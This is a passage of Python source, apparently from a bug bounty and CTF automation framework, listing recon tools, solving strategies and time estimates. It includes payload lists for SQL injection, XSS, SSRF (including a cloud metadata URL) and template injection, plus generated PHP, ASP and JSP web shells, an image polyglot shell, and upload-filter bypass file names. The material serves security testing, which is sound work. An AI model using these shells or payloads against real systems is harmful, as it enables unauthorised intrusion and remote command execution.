                {"name": "Template Injection", "payloads": ["{{7*7}}", "${7*7}", "#{7*7}"]}
            ],
            "sqli": [
                {"name": "Union-based SQLi", "payloads": ["' UNION SELECT 1,2,3--", "' OR 1=1--"]},
                {"name": "Boolean-based SQLi", "payloads": ["' AND 1=1--", "' AND 1=2--"]},
                {"name": "Time-based SQLi", "payloads": ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--"]}
            ],
            "xss": [
                {"name": "Reflected XSS", "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]},
                {"name": "Stored XSS", "payloads": ["<script>alert('XSS')</script>"]},
                {"name": "DOM XSS", "payloads": ["javascript:alert(1)", "#<script>alert(1)</script>"]}
            ],
            "ssrf": [
                {"name": "Internal Network", "payloads": ["http://127.0.0.1:80", "http://localhost:22"]},
                {"name": "Cloud Metadata", "payloads": ["http://169.254.169.254/latest/meta-data/"]},
                {"name": "DNS Exfiltration", "payloads": ["http://burpcollaborator.net"]}
            ],
            "idor": [
                {"name": "Numeric IDOR", "payloads": ["id=1", "id=2", "id=../1"]},
                {"name": "UUID IDOR", "payloads": ["uuid=00000000-0000-0000-0000-000000000001"]},
                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}  # base64 encoded 1,2
            ]
        }

        return scenarios.get(vuln_type, [])

    def create_business_logic_testing_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create business logic testing workflow"""
        workflow = {
            "target": target.domain,
            "business_logic_tests": [
                {
                    "category": "Authentication Bypass",
                    "tests": [
                        {"name": "Password Reset Token Reuse", "method": "manual"},
                        {"name": "JWT Algorithm Confusion", "method": "automated", "tool": "jwt_tool"},
                        {"name": "Session Fixation", "method": "manual"},
                        {"name": "OAuth Flow Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Authorization Flaws",
                    "tests": [
                        {"name": "Horizontal Privilege Escalation", "method": "automated", "tool": "arjun"},
                        {"name": "Vertical Privilege Escalation", "method": "manual"},
                        {"name": "Role-based Access Control Bypass", "method": "manual"}
                    ]
                },
                {
                    "category": "Business Process Manipulation",
                    "tests": [
                        {"name": "Race Conditions", "method": "automated", "tool": "race_the_web"},
                        {"name": "Price Manipulation", "method": "manual"},
                        {"name": "Quantity Limits Bypass", "method": "manual"},
                        {"name": "Workflow State Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Input Validation Bypass",
                    "tests": [
                        {"name": "File Upload Restrictions", "method": "automated", "tool": "upload_scanner"},
                        {"name": "Content-Type Bypass", "method": "manual"},
                        {"name": "Size Limit Bypass", "method": "manual"}
                    ]
                }
            ],
            "estimated_time": 480,  # 8 hours for thorough business logic testing
            "manual_testing_required": True
        }

        return workflow

    def create_osint_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create OSINT gathering workflow"""
        workflow = {
            "target": target.domain,
            "osint_phases": [
                {
                    "name": "Domain Intelligence",
                    "tools": [
                        {"tool": "whois", "params": {"domain": target.domain}},
                        {"tool": "dnsrecon", "params": {"domain": target.domain}},
                        {"tool": "certificate_transparency", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Social Media Intelligence",
                    "tools": [
                        {"tool": "sherlock", "params": {"username": "target_company"}},
                        {"tool": "social_mapper", "params": {"company": target.domain}},
                        {"tool": "linkedin_scraper", "params": {"company": target.domain}}
                    ]
                },
                {
                    "name": "Email Intelligence",
                    "tools": [
                        {"tool": "hunter_io", "params": {"domain": target.domain}},
                        {"tool": "haveibeenpwned", "params": {"domain": target.domain}},
                        {"tool": "email_validator", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Technology Intelligence",
                    "tools": [
                        {"tool": "builtwith", "params": {"domain": target.domain}},
                        {"tool": "wappalyzer", "params": {"domain": target.domain}},
                        {"tool": "shodan", "params": {"query": f"hostname:{target.domain}"}}
                    ]
                }
            ],
            "estimated_time": 240,
            "intelligence_types": ["technical", "social", "business", "infrastructure"]
        }

        return workflow

class FileUploadTestingFramework:
    """Specialized framework for file upload vulnerability testing"""

    def __init__(self):
        self.malicious_extensions = [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".asp", ".aspx", ".jsp", ".jspx",
            ".py", ".rb", ".pl", ".cgi",
            ".sh", ".bat", ".cmd", ".exe"
        ]

        self.bypass_techniques = [
            "double_extension",
            "null_byte",
            "content_type_spoofing",
            "magic_bytes",
            "case_variation",
            "special_characters"
        ]

    def generate_test_files(self) -> Dict[str, Any]:
        """Generate various test files for upload testing"""
        test_files = {
            "web_shells": [
                {"name": "simple_php_shell.php", "content": "<?php system($_GET['cmd']); ?>"},
                {"name": "asp_shell.asp", "content": "<%eval request(\"cmd\")%>"},
                {"name": "jsp_shell.jsp", "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"}
            ],
            "bypass_files": [
                {"name": "shell.php.txt", "technique": "double_extension"},
                {"name": "shell.php%00.txt", "technique": "null_byte"},
                {"name": "shell.PhP", "technique": "case_variation"},
                {"name": "shell.php.", "technique": "trailing_dot"}
            ],
            "polyglot_files": [
                {"name": "polyglot.jpg", "content": "GIF89a<?php system($_GET['cmd']); ?>", "technique": "image_polyglot"}
            ]
        }

        return test_files

    def create_upload_testing_workflow(self, target_url: str) -> Dict[str, Any]:
        """Create comprehensive file upload testing workflow"""
        workflow = {
            "target": target_url,
            "test_phases": [
                {
                    "name": "reconnaissance",
                    "description": "Identify upload endpoints",
                    "tools": ["katana", "gau", "paramspider"],
                    "expected_findings": ["upload_forms", "api_endpoints"]
                },
                {
                    "name": "baseline_testing",
                    "description": "Test legitimate file uploads",
                    "test_files": ["image.jpg", "document.pdf", "text.txt"],
                    "observations": ["response_codes", "file_locations", "naming_conventions"]
                },
                {
                    "name": "malicious_upload_testing",
                    "description": "Test malicious file uploads",
                    "test_files": self.generate_test_files(),
                    "bypass_techniques": self.bypass_techniques
                },
                {
                    "name": "post_upload_verification",
                    "description": "Verify uploaded files and test execution",
                    "actions": ["file_access_test", "execution_test", "path_traversal_test"]
                }
            ],
            "estimated_time": 360,
            "risk_level": "high"
        }

        return workflow

# Global bug bounty workflow manager
bugbounty_manager = BugBountyWorkflowManager()
fileupload_framework = FileUploadTestingFramework()

# ============================================================================
# CTF COMPETITION EXCELLENCE FRAMEWORK (v6.0 ENHANCEMENT)
# ============================================================================

@dataclass
class CTFChallenge:
    """CTF challenge information"""
    name: str
    category: str  # web, crypto, pwn, forensics, rev, misc, osint
    description: str
    points: int = 0
    difficulty: str = "unknown"  # easy, medium, hard, insane
    files: List[str] = field(default_factory=list)
    url: str = ""
    hints: List[str] = field(default_factory=list)

class CTFWorkflowManager:
    """Specialized workflow manager for CTF competitions"""

    def __init__(self):
        self.category_tools = {
            "web": {
                "reconnaissance": ["httpx", "katana", "gau", "waybackurls"],
                "vulnerability_scanning": ["nuclei", "dalfox", "sqlmap", "nikto"],
                "content_discovery": ["gobuster", "dirsearch", "feroxbuster"],
                "parameter_testing": ["arjun", "paramspider", "x8"],
                "specialized": ["wpscan", "joomscan", "droopescan"]
            },
            "crypto": {
                "hash_analysis": ["hashcat", "john", "hash-identifier"],
                "cipher_analysis": ["cipher-identifier", "cryptool", "cyberchef"],
                "rsa_attacks": ["rsatool", "factordb", "yafu"],
                "frequency_analysis": ["frequency-analysis", "substitution-solver"],
                "modern_crypto": ["sage", "pycrypto", "cryptography"]
            },
            "pwn": {
                "binary_analysis": ["checksec", "ghidra", "radare2", "gdb-peda"],
                "exploit_development": ["pwntools", "ropper", "one-gadget"],
                "heap_exploitation": ["glibc-heap-analysis", "heap-viewer"],
                "format_string": ["format-string-exploiter"],
                "rop_chains": ["ropgadget", "ropper", "angr"]
            },
            "forensics": {
                "file_analysis": ["file", "binwalk", "foremost", "photorec"],
                "image_forensics": ["exiftool", "steghide", "stegsolve", "zsteg"],
                "memory_forensics": ["volatility", "rekall"],
                "network_forensics": ["wireshark", "tcpdump", "networkminer"],
                "disk_forensics": ["autopsy", "sleuthkit", "testdisk"]
            },
            "rev": {
                "disassemblers": ["ghidra", "ida", "radare2", "binary-ninja"],
                "debuggers": ["gdb", "x64dbg", "ollydbg"],
                "decompilers": ["ghidra", "hex-rays", "retdec"],
                "packers": ["upx", "peid", "detect-it-easy"],
                "analysis": ["strings", "ltrace", "strace", "objdump"]
            },
            "misc": {
                "encoding": ["base64", "hex", "url-decode", "rot13"],
                "compression": ["zip", "tar", "gzip", "7zip"],
                "qr_codes": ["qr-decoder", "zbar"],
                "audio_analysis": ["audacity", "sonic-visualizer"],
                "esoteric": ["brainfuck", "whitespace", "piet"]
            },
            "osint": {
                "search_engines": ["google-dorking", "shodan", "censys"],
                "social_media": ["sherlock", "social-analyzer"],
                "image_analysis": ["reverse-image-search", "exif-analysis"],
                "domain_analysis": ["whois", "dns-analysis", "certificate-transparency"],
                "geolocation": ["geoint", "osm-analysis", "satellite-imagery"]
            }
        }

        self.solving_strategies = {
            "web": [
                {"strategy": "source_code_analysis", "description": "Analyze HTML/JS source for hidden information"},
                {"strategy": "directory_traversal", "description": "Test for path traversal vulnerabilities"},
                {"strategy": "sql_injection", "description": "Test for SQL injection in all parameters"},
                {"strategy": "xss_exploitation", "description": "Test for XSS and exploit for admin access"},
                {"strategy": "authentication_bypass", "description": "Test for auth bypass techniques"},
                {"strategy": "session_manipulation", "description": "Analyze and manipulate session tokens"},
                {"strategy": "file_upload_bypass", "description": "Test file upload restrictions and bypasses"}
            ],
            "crypto": [
                {"strategy": "frequency_analysis", "description": "Perform frequency analysis for substitution ciphers"},
                {"strategy": "known_plaintext", "description": "Use known plaintext attacks"},
                {"strategy": "weak_keys", "description": "Test for weak cryptographic keys"},
                {"strategy": "implementation_flaws", "description": "Look for implementation vulnerabilities"},
                {"strategy": "side_channel", "description": "Exploit timing or other side channels"},
                {"strategy": "mathematical_attacks", "description": "Use mathematical properties to break crypto"}
            ],
            "pwn": [
                {"strategy": "buffer_overflow", "description": "Exploit buffer overflow vulnerabilities"},
                {"strategy": "format_string", "description": "Exploit format string vulnerabilities"},
                {"strategy": "rop_chains", "description": "Build ROP chains for exploitation"},
                {"strategy": "heap_exploitation", "description": "Exploit heap-based vulnerabilities"},
                {"strategy": "race_conditions", "description": "Exploit race condition vulnerabilities"},
                {"strategy": "integer_overflow", "description": "Exploit integer overflow conditions"}
            ],
            "forensics": [
                {"strategy": "file_carving", "description": "Recover deleted or hidden files"},
                {"strategy": "metadata_analysis", "description": "Analyze file metadata for hidden information"},
                {"strategy": "steganography", "description": "Extract hidden data from images/audio"},
                {"strategy": "memory_analysis", "description": "Analyze memory dumps for artifacts"},
                {"strategy": "network_analysis", "description": "Analyze network traffic for suspicious activity"},
                {"strategy": "timeline_analysis", "description": "Reconstruct timeline of events"}
            ],
            "rev": [
                {"strategy": "static_analysis", "description": "Analyze binary without execution"},
                {"strategy": "dynamic_analysis", "description": "Analyze binary during execution"},
                {"strategy": "anti_debugging", "description": "Bypass anti-debugging techniques"},
                {"strategy": "unpacking", "description": "Unpack packed/obfuscated binaries"},
                {"strategy": "algorithm_recovery", "description": "Reverse engineer algorithms"},
                {"strategy": "key_recovery", "description": "Extract encryption keys from binaries"}
            ]
        }

    def create_ctf_challenge_workflow(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Create advanced specialized workflow for CTF challenge with AI-powered optimization"""
        workflow = {
            "challenge": challenge.name,
            "category": challenge.category,
            "difficulty": challenge.difficulty,
            "points": challenge.points,
            "tools": [],
            "strategies": [],
            "estimated_time": 0,
            "success_probability": 0.0,
            "automation_level": "high",
            "parallel_tasks": [],
            "dependencies": [],
            "fallback_strategies": [],
            "resource_requirements": {},
            "expected_artifacts": [],
            "validation_steps": []
        }

        # Enhanced tool selection using CTFToolManager
        ctf_tool_manager = CTFToolManager()
        workflow["tools"] = ctf_tool_manager.suggest_tools_for_challenge(challenge.description, challenge.category)

        # Get category-specific strategies with enhanced intelligence
        if challenge.category in self.solving_strategies:
            workflow["strategies"] = self.solving_strategies[challenge.category]
            # Add fallback strategies for robustness
            workflow["fallback_strategies"] = self._generate_fallback_strategies(challenge.category)

        # Advanced time estimation with machine learning-like scoring
        base_times = {
            "easy": {"min": 15, "avg": 30, "max": 60},
            "medium": {"min": 30, "avg": 60, "max": 120},
            "hard": {"min": 60, "avg": 120, "max": 240},
            "insane": {"min": 120, "avg": 240, "max": 480},
            "unknown": {"min": 45, "avg": 90, "max": 180}
        }

        # Factor in category complexity
        category_multipliers = {
            "web": 1.0,
            "crypto": 1.3,
            "pwn": 1.5,
            "forensics": 1.2,
            "rev": 1.4,
            "misc": 0.8,
            "osint": 0.9
        }

        base_time = base_times[challenge.difficulty]["avg"]
        category_mult = category_multipliers.get(challenge.category, 1.0)

        # Adjust based on description complexity
        description_complexity = self._analyze_description_complexity(challenge.description)
        complexity_mult = 1.0 + (description_complexity * 0.3)

        workflow["estimated_time"] = int(base_time * category_mult * complexity_mult * 60)  # Convert to seconds

        # Enhanced success probability calculation
        base_success = {
            "easy": 0.85,
            "medium": 0.65,
            "hard": 0.45,
            "insane": 0.25,
            "unknown": 0.55
        }[challenge.difficulty]

        # Adjust based on tool availability and category expertise
        tool_availability_bonus = min(0.15, len(workflow["tools"]) * 0.02)
        workflow["success_probability"] = min(0.95, base_success + tool_availability_bonus)

        # Add advanced workflow components
        workflow["workflow_steps"] = self._create_advanced_category_workflow(challenge)
        workflow["parallel_tasks"] = self._identify_parallel_tasks(challenge.category)
        workflow["resource_requirements"] = self._calculate_resource_requirements(challenge)
        workflow["expected_artifacts"] = self._predict_expected_artifacts(challenge)
        workflow["validation_steps"] = self._create_validation_steps(challenge.category)

        return workflow

    def _select_tools_for_challenge(self, challenge: CTFChallenge, category_tools: Dict[str, List[str]]) -> List[str]:
        """Select appropriate tools based on challenge details"""
        selected_tools = []

        # Always include reconnaissance tools for the category
        if "reconnaissance" in category_tools:
            selected_tools.extend(category_tools["reconnaissance"][:2])  # Top 2 recon tools

        # Add specialized tools based on challenge description
        description_lower = challenge.description.lower()

        if challenge.category == "web":
            if any(keyword in description_lower for keyword in ["sql", "injection", "database"]):
                selected_tools.append("sqlmap")
            if any(keyword in description_lower for keyword in ["xss", "script", "javascript"]):
                selected_tools.append("dalfox")
            if any(keyword in description_lower for keyword in ["wordpress", "wp"]):
                selected_tools.append("wpscan")
            if any(keyword in description_lower for keyword in ["upload", "file"]):
                selected_tools.extend(["gobuster", "feroxbuster"])

        elif challenge.category == "crypto":
            if any(keyword in description_lower for keyword in ["hash", "md5", "sha"]):
                selected_tools.extend(["hashcat", "john"])
            if any(keyword in description_lower for keyword in ["rsa", "public key"]):
                selected_tools.extend(["rsatool", "factordb"])
            if any(keyword in description_lower for keyword in ["cipher", "encrypt"]):
                selected_tools.extend(["cipher-identifier", "cyberchef"])

        elif challenge.category == "pwn":
            selected_tools.extend(["checksec", "ghidra", "pwntools"])
            if any(keyword in description_lower for keyword in ["heap", "malloc"]):
                selected_tools.append("glibc-heap-analysis")
            if any(keyword in description_lower for keyword in ["format", "printf"]):
                selected_tools.append("format-string-exploiter")

        elif challenge.category == "forensics":
            if any(keyword in description_lower for keyword in ["image", "jpg", "png"]):
                selected_tools.extend(["exiftool", "steghide", "stegsolve"])
            if any(keyword in description_lower for keyword in ["memory", "dump"]):
                selected_tools.append("volatility")
            if any(keyword in description_lower for keyword in ["network", "pcap"]):
                selected_tools.extend(["wireshark", "tcpdump"])

        elif challenge.category == "rev":
            selected_tools.extend(["ghidra", "radare2", "strings"])
            if any(keyword in description_lower for keyword in ["packed", "upx"]):
                selected_tools.extend(["upx", "peid"])

        # Remove duplicates while preserving order
        return list(dict.fromkeys(selected_tools))

    def _create_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
        """Create category-specific workflow steps"""
        workflows = {
            "web": [
                {"step": 1, "action": "reconnaissance", "description": "Analyze target URL and gather information"},
                {"step": 2, "action": "source_analysis", "description": "Examine HTML/JS source code for clues"},
                {"step": 3, "action": "directory_discovery", "description": "Discover hidden directories and files"},
                {"step": 4, "action": "vulnerability_testing", "description": "Test for common web vulnerabilities"},
                {"step": 5, "action": "exploitation", "description": "Exploit discovered vulnerabilities"},
                {"step": 6, "action": "flag_extraction", "description": "Extract flag from compromised system"}
            ],
            "crypto": [
                {"step": 1, "action": "cipher_identification", "description": "Identify the type of cipher or encoding"},
                {"step": 2, "action": "key_analysis", "description": "Analyze key properties and weaknesses"},
                {"step": 3, "action": "attack_selection", "description": "Select appropriate cryptographic attack"},
                {"step": 4, "action": "implementation", "description": "Implement and execute the attack"},
                {"step": 5, "action": "verification", "description": "Verify the decrypted result"},
                {"step": 6, "action": "flag_extraction", "description": "Extract flag from decrypted data"}
            ],
            "pwn": [
                {"step": 1, "action": "binary_analysis", "description": "Analyze binary protections and architecture"},
                {"step": 2, "action": "vulnerability_discovery", "description": "Find exploitable vulnerabilities"},
                {"step": 3, "action": "exploit_development", "description": "Develop exploit payload"},
                {"step": 4, "action": "local_testing", "description": "Test exploit locally"},
                {"step": 5, "action": "remote_exploitation", "description": "Execute exploit against remote target"},
                {"step": 6, "action": "shell_interaction", "description": "Interact with gained shell to find flag"}
            ],
            "forensics": [
                {"step": 1, "action": "file_analysis", "description": "Analyze provided files and their properties"},
                {"step": 2, "action": "data_recovery", "description": "Recover deleted or hidden data"},
                {"step": 3, "action": "artifact_extraction", "description": "Extract relevant artifacts and evidence"},
                {"step": 4, "action": "timeline_reconstruction", "description": "Reconstruct timeline of events"},
                {"step": 5, "action": "correlation_analysis", "description": "Correlate findings across different sources"},
                {"step": 6, "action": "flag_discovery", "description": "Locate flag in recovered data"}
            ],
            "rev": [
                {"step": 1, "action": "static_analysis", "description": "Perform static analysis of the binary"},
                {"step": 2, "action": "dynamic_analysis", "description": "Run binary and observe behavior"},
                {"step": 3, "action": "algorithm_identification", "description": "Identify key algorithms and logic"},
                {"step": 4, "action": "key_extraction", "description": "Extract keys or important values"},
                {"step": 5, "action": "solution_implementation", "description": "Implement solution based on analysis"},
                {"step": 6, "action": "flag_generation", "description": "Generate or extract the flag"}
            ]
        }

        return workflows.get(challenge.category, [
            {"step": 1, "action": "analysis", "description": "Analyze the challenge"},
            {"step": 2, "action": "research", "description": "Research relevant techniques"},
            {"step": 3, "action": "implementation", "description": "Implement solution"},
            {"step": 4, "action": "testing", "description": "Test the solution"},
            {"step": 5, "action": "refinement", "description": "Refine approach if needed"},
            {"step": 6, "action": "flag_submission", "description": "Submit the flag"}
        ])

    def create_ctf_team_strategy(self, challenges: List[CTFChallenge], team_size: int = 4) -> Dict[str, Any]:
        """Create team strategy for CTF competition"""
        strategy = {
            "team_size": team_size,
            "challenge_allocation": {},
            "priority_order": [],
            "estimated_total_time": 0,
            "expected_score": 0
        }

        # Sort challenges by points/time ratio for optimal strategy
        challenge_efficiency = []
        for challenge in challenges:
            workflow = self.create_ctf_challenge_workflow(challenge)
            efficiency = (challenge.points * workflow["success_probability"]) / (workflow["estimated_time"] / 3600)  # points per hour
            challenge_efficiency.append({
                "challenge": challenge,
                "efficiency": efficiency,
                "workflow": workflow
            })

        # Sort by efficiency (highest first)
        challenge_efficiency.sort(key=lambda x: x["efficiency"], reverse=True)

        # Allocate challenges to team members
        team_workload = [0] * team_size
        for i, item in enumerate(challenge_efficiency):
            # Assign to team member with least workload
            team_member = team_workload.index(min(team_workload))

            if team_member not in strategy["challenge_allocation"]:
                strategy["challenge_allocation"][team_member] = []

            strategy["challenge_allocation"][team_member].append({
                "challenge": item["challenge"].name,
                "category": item["challenge"].category,
                "points": item["challenge"].points,
                "estimated_time": item["workflow"]["estimated_time"],
                "success_probability": item["workflow"]["success_probability"]
            })

            team_workload[team_member] += item["workflow"]["estimated_time"]
            strategy["expected_score"] += item["challenge"].points * item["workflow"]["success_probability"]

        strategy["estimated_total_time"] = max(team_workload)
        strategy["priority_order"] = [item["challenge"].name for item in challenge_efficiency]

        return strategy

    def _generate_fallback_strategies(self, category: str) -> List[Dict[str, str]]:
        """Generate fallback strategies for when primary approaches fail"""
        fallback_strategies = {
            "web": [
                {"strategy": "manual_source_review", "description": "Manually review all source code and comments"},
                {"strategy": "alternative_wordlists", "description": "Try alternative wordlists and fuzzing techniques"},
                {"strategy": "parameter_pollution", "description": "Test for HTTP parameter pollution vulnerabilities"},
                {"strategy": "race_conditions", "description": "Test for race condition vulnerabilities"},
                {"strategy": "business_logic", "description": "Focus on business logic flaws and edge cases"}
            ],
            "crypto": [
                {"strategy": "known_plaintext_attack", "description": "Use any known plaintext for cryptanalysis"},
                {"strategy": "frequency_analysis_variants", "description": "Try different frequency analysis approaches"},
                {"strategy": "mathematical_properties", "description": "Exploit mathematical properties of the cipher"},
                {"strategy": "implementation_weaknesses", "description": "Look for implementation-specific weaknesses"},
                {"strategy": "side_channel_analysis", "description": "Analyze timing or other side channels"}
            ],
            "pwn": [
                {"strategy": "alternative_exploitation", "description": "Try alternative exploitation techniques"},
                {"strategy": "information_leaks", "description": "Exploit information disclosure vulnerabilities"},
                {"strategy": "heap_feng_shui", "description": "Use heap manipulation techniques"},
                {"strategy": "ret2libc_variants", "description": "Try different ret2libc approaches"},
                {"strategy": "sigreturn_oriented", "description": "Use SIGROP (Signal Return Oriented Programming)"}
            ],
            "forensics": [
                {"strategy": "alternative_tools", "description": "Try different forensics tools and approaches"},
                {"strategy": "manual_hex_analysis", "description": "Manually analyze hex dumps and file structures"},
                {"strategy": "correlation_analysis", "description": "Correlate findings across multiple evidence sources"},
                {"strategy": "timeline_reconstruction", "description": "Reconstruct detailed timeline of events"},
                {"strategy": "deleted_data_recovery", "description": "Focus on recovering deleted or hidden data"}
            ],
            "rev": [
                {"strategy": "dynamic_analysis_focus", "description": "Shift focus to dynamic analysis techniques"},
                {"strategy": "anti_analysis_bypass", "description": "Bypass anti-analysis and obfuscation"},
                {"strategy": "library_analysis", "description": "Analyze linked libraries and dependencies"},
                {"strategy": "algorithm_identification", "description": "Focus on identifying key algorithms"},
                {"strategy": "patch_analysis", "description": "Analyze patches or modifications to standard code"}
            ],
            "misc": [
                {"strategy": "alternative_interpretations", "description": "Try alternative interpretations of the challenge"},
                {"strategy": "encoding_combinations", "description": "Try combinations of different encodings"},
                {"strategy": "esoteric_approaches", "description": "Consider esoteric or unusual solution approaches"},
                {"strategy": "metadata_focus", "description": "Focus heavily on metadata and hidden information"},
                {"strategy": "collaborative_solving", "description": "Use collaborative problem-solving techniques"}
            ],
            "osint": [
                {"strategy": "alternative_sources", "description": "Try alternative information sources"},
                {"strategy": "historical_data", "description": "Look for historical or archived information"},
                {"strategy": "social_engineering", "description": "Use social engineering techniques (ethically)"},
                {"strategy": "cross_reference", "description": "Cross-reference information across multiple platforms"},
                {"strategy": "deep_web_search", "description": "Search in deep web and specialized databases"}
            ]
        }
        return fallback_strategies.get(category, [])

    def _analyze_description_complexity(self, description: str) -> float:
        """Analyze challenge description complexity to adjust time estimates"""
        complexity_score = 0.0
        description_lower = description.lower()

        # Length-based complexity
        if len(description) > 500:
            complexity_score += 0.3
        elif len(description) > 200:
            complexity_score += 0.1

        # Technical term density
        technical_terms = [
            "algorithm", "encryption", "decryption", "vulnerability", "exploit",
            "buffer overflow", "sql injection", "xss", "csrf", "authentication",
            "authorization", "cryptography", "steganography", "forensics",
            "reverse engineering", "binary analysis", "memory corruption",
            "heap", "stack", "rop", "shellcode", "payload"
        ]

        term_count = sum(1 for term in technical_terms if term in description_lower)
        complexity_score += min(0.4, term_count * 0.05)

        # Multi-step indicators
        multi_step_indicators = ["first", "then", "next", "after", "finally", "step"]
        step_count = sum(1 for indicator in multi_step_indicators if indicator in description_lower)
        complexity_score += min(0.3, step_count * 0.1)

        return min(1.0, complexity_score)

    def _create_advanced_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
        """Create advanced category-specific workflow with parallel execution support"""
        advanced_workflows = {
            "web": [
                {"step": 1, "action": "automated_reconnaissance", "description": "Automated web reconnaissance and technology detection", "parallel": True, "tools": ["httpx", "whatweb", "katana"], "estimated_time": 300},
                {"step": 2, "action": "source_code_analysis", "description": "Comprehensive source code and comment analysis", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 3, "action": "directory_enumeration", "description": "Multi-tool directory and file enumeration", "parallel": True, "tools": ["gobuster", "dirsearch", "feroxbuster"], "estimated_time": 900},
                {"step": 4, "action": "parameter_discovery", "description": "Parameter discovery and testing", "parallel": True, "tools": ["arjun", "paramspider"], "estimated_time": 600},
                {"step": 5, "action": "vulnerability_scanning", "description": "Automated vulnerability scanning", "parallel": True, "tools": ["sqlmap", "dalfox", "nikto"], "estimated_time": 1200},
                {"step": 6, "action": "manual_testing", "description": "Manual testing of discovered attack vectors", "parallel": False, "tools": ["manual"], "estimated_time": 1800},
                {"step": 7, "action": "exploitation", "description": "Exploit discovered vulnerabilities", "parallel": False, "tools": ["custom"], "estimated_time": 900},
                {"step": 8, "action": "flag_extraction", "description": "Extract and validate flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "crypto": [
                {"step": 1, "action": "cipher_identification", "description": "Identify cipher type and properties", "parallel": False, "tools": ["cipher-identifier", "hash-identifier"], "estimated_time": 300},
                {"step": 2, "action": "key_space_analysis", "description": "Analyze key space and potential weaknesses", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 3, "action": "automated_attacks", "description": "Launch automated cryptographic attacks", "parallel": True, "tools": ["hashcat", "john", "factordb"], "estimated_time": 1800},
                {"step": 4, "action": "mathematical_analysis", "description": "Mathematical analysis of cipher properties", "parallel": False, "tools": ["sage", "python"], "estimated_time": 1200},
                {"step": 5, "action": "frequency_analysis", "description": "Statistical and frequency analysis", "parallel": True, "tools": ["frequency-analysis", "substitution-solver"], "estimated_time": 900},
                {"step": 6, "action": "known_plaintext", "description": "Known plaintext and chosen plaintext attacks", "parallel": False, "tools": ["custom"], "estimated_time": 1200},
                {"step": 7, "action": "implementation_analysis", "description": "Analyze implementation for weaknesses", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 8, "action": "solution_verification", "description": "Verify and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "pwn": [
                {"step": 1, "action": "binary_reconnaissance", "description": "Comprehensive binary analysis and protection identification", "parallel": True, "tools": ["checksec", "file", "strings", "objdump"], "estimated_time": 600},
                {"step": 2, "action": "static_analysis", "description": "Static analysis with multiple tools", "parallel": True, "tools": ["ghidra", "radare2", "ida"], "estimated_time": 1800},
                {"step": 3, "action": "dynamic_analysis", "description": "Dynamic analysis and debugging", "parallel": False, "tools": ["gdb-peda", "ltrace", "strace"], "estimated_time": 1200},
                {"step": 4, "action": "vulnerability_identification", "description": "Identify exploitable vulnerabilities", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 5, "action": "exploit_development", "description": "Develop exploit payload", "parallel": False, "tools": ["pwntools", "ropper", "one-gadget"], "estimated_time": 2400},
                {"step": 6, "action": "local_testing", "description": "Test exploit locally", "parallel": False, "tools": ["gdb-peda"], "estimated_time": 600},
                {"step": 7, "action": "remote_exploitation", "description": "Execute exploit against remote target", "parallel": False, "tools": ["pwntools"], "estimated_time": 600},
                {"step": 8, "action": "post_exploitation", "description": "Post-exploitation and flag extraction", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "forensics": [
                {"step": 1, "action": "evidence_acquisition", "description": "Acquire and validate digital evidence", "parallel": False, "tools": ["file", "exiftool"], "estimated_time": 300},
                {"step": 2, "action": "file_analysis", "description": "Comprehensive file structure analysis", "parallel": True, "tools": ["binwalk", "foremost", "strings"], "estimated_time": 900},
                {"step": 3, "action": "metadata_extraction", "description": "Extract and analyze metadata", "parallel": True, "tools": ["exiftool", "steghide"], "estimated_time": 600},
                {"step": 4, "action": "steganography_detection", "description": "Detect and extract hidden data", "parallel": True, "tools": ["stegsolve", "zsteg", "outguess"], "estimated_time": 1200},
                {"step": 5, "action": "memory_analysis", "description": "Memory dump analysis if applicable", "parallel": False, "tools": ["volatility", "volatility3"], "estimated_time": 1800},
                {"step": 6, "action": "network_analysis", "description": "Network traffic analysis if applicable", "parallel": False, "tools": ["wireshark", "tcpdump"], "estimated_time": 1200},
                {"step": 7, "action": "timeline_reconstruction", "description": "Reconstruct timeline of events", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 8, "action": "evidence_correlation", "description": "Correlate findings and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 600}
            ],
            "rev": [
                {"step": 1, "action": "binary_triage", "description": "Initial binary triage and classification", "parallel": True, "tools": ["file", "strings", "checksec"], "estimated_time": 300},
                {"step": 2, "action": "packer_detection", "description": "Detect and unpack if necessary", "parallel": False, "tools": ["upx", "peid", "detect-it-easy"], "estimated_time": 600},
                {"step": 3, "action": "static_disassembly", "description": "Static disassembly and analysis", "parallel": True, "tools": ["ghidra", "ida", "radare2"], "estimated_time": 2400},
                {"step": 4, "action": "dynamic_analysis", "description": "Dynamic analysis and debugging", "parallel": False, "tools": ["gdb-peda", "ltrace", "strace"], "estimated_time": 1800},
                {"step": 5, "action": "algorithm_identification", "description": "Identify key algorithms and logic", "parallel": False, "tools": ["manual"], "estimated_time": 1200},
                {"step": 6, "action": "key_extraction", "description": "Extract keys, passwords, or critical values", "parallel": False, "tools": ["manual"], "estimated_time": 900},
                {"step": 7, "action": "solution_implementation", "description": "Implement solution based on analysis", "parallel": False, "tools": ["python", "custom"], "estimated_time": 1200},
                {"step": 8, "action": "flag_generation", "description": "Generate or extract the flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "misc": [
